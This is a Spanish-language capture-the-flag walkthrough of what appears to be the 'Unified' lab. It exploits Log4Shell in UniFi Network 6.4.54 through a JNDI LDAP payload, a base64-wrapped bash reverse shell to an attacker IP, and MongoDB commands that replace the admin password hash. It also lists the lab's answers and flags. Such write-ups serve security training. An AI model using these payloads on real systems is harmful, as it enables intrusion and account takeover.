@@ -1,0 +1,178 @@
+##### Unified
+Unified
+
+1. Which are the first four open ports? → 22,6789,8080,8443
+
+
+
+2. What is the title of the software that is running on port 8443? → UniFi Network
+
+
+
+3. What is the version of the software that is running? → 6.4.54
+
+No vemos la version a simple vista, vamos a acceder al puerto y vemos la pagina de login en la que se aprecia la version 6.4.54, con la que podemos buscar el CVE en mitre.
+
+
+
+
+
+
+
+4.  What is the CVE for the identified vulnerability? → CVE-2021-44228
+
+Buscando en mitre vemos que Log4j afecta hasta la version 6.5.54.
+
+
+
+
+5. What protocol does JNDI leverage in the injection? → ldap
+
+
+
+6. What tool do we use to intercept the traffic, indicating the attack was successful? → tcpdump
+
+
+
+Introducimos la siguiente línea como payload en la variable remember:
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+${jndi:ldap://10.10.15.36:389/manage}
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Corremos tcpdump en la interfaz tun0 y puerto 389 
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+sudo tcpdump -i tun0 port 389
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vemos la respuesta 
+
+
+7. What port do we need to inspect intercepted traffic for? → 389
+
+Es el puerto utilizado por LDAP.
+
+8. What port is the MongoDB service running on? → 27117
+
+Vamos a utilizar maven para ejecutar el repositorio de github rogue-jndi (https://github.com/veracode-research/rogue-jndi), el cual inicia un servidor LDAP local y nos permite recibir conexiones de un servidor vulnerable y ejecutar código malicioso. Descargamos el repositorio y ejecutamos mvn package para compilarlo.
+
+Vamos a utilizar el siguiiente comando para convertir nuestro payload en base64:
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+echo 'bash -c bash -i >&/dev/tcp/10.10.15.64/1389 0>&1' | base64
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Tras esto ejecutamos el .jar que ha generado maven y que está ubicado en la carpeta target del repositorio descargado:
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTUuNjQvMTM4OSAwPiYxCg==}|
+{base64,-d}|{bash,-i}" --hostname "10.10.15.64"
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Tras ejecutarlo se levanta el servidor LDAP y nos podemos poner a escuchar con netcat en el puerto que hemos introducido como payload
+
+
+Si volvemos a poner el payload que hemos obtenido en la imagen anterior en burpsuite y lo enviamos, recibimos respuesta en nuestro netcat.
+
+
+
+
+En este momento, si ejecutamos en la salida de netcat el siguiente comando conseguimos uns shell en el sistema.
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+script /dev/null -c bash
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+
+Una vez dentro, podemos ver que tiene mongodb.
+
+
+
+También se puede ver con ps aux
+
+
+
+Si grepeamos mongo encontramos más datos, como el puerto.
+
+
+
+
+
+9. What is the default database name for UniFi applications? → ace
+
+
+
+10. What is the function we use to enumerate users within the database in MongoDB? → db.admin.find()
+
+Con el comando siguiente accedemos a mongodb en el puerto encontrado.
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+mongo --port 27117
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Tras esto usando help vemos las opciones disponibles
+
+
+
+Tras esto podemos ver las bases de datos que existen, donde vemos la por defecto ace.
+
+
+
+Con el siguiente comando podemos ver todos los usuarios en un formato visible, donde --eval traduce un json.
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Con esto podemos encontrar un usuario administrador y el hash de su contraseña
+
+
+
+Una vez que tenemos acceso a la base de datos de usuarios y vemos que se guarda en ella la contraseña, no podemos desencriptarla, pero si sustituirla por una nuestra, generandola con el comando siguiente e introduciendola en la base de datos:
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+mkpasswd -m sha-512 Password1234
+
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$s.B0j48w5v3B/YTw$zUpfDKgkiYXYV0ERFmYAjFwxbkXXn.Z7yTRlBEBpBAset5ep87F.8DyXF926PpA6UmCt.V/d08yFclbc5J/Km/"}})'
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Una vez cambiada la contraseña podemos ir a la página de login de UniFi y probar las credenciales.
+
+
+
+11. What is the function we use to update users within the database in MongoDB? → db.admin.update()
+
+
+
+12. What is the password for the root user? → NotACrackablePassword4U2022
+
+Una vez dentro vemos que al ir a la configuración, en el apartado de conexion ssh están introducidas las credenciales de root.
+
+
+
+Con esta contraseña podemos acceder por ssh al sistema como root y visualizar el flag.
+
+13. Submit user flag → 6ced1a6a89e666c0620cdb10262ba127
+
+
+
+14. Submit root flag  → e50bc93c75b634e4b272d2f771c33681
+
+
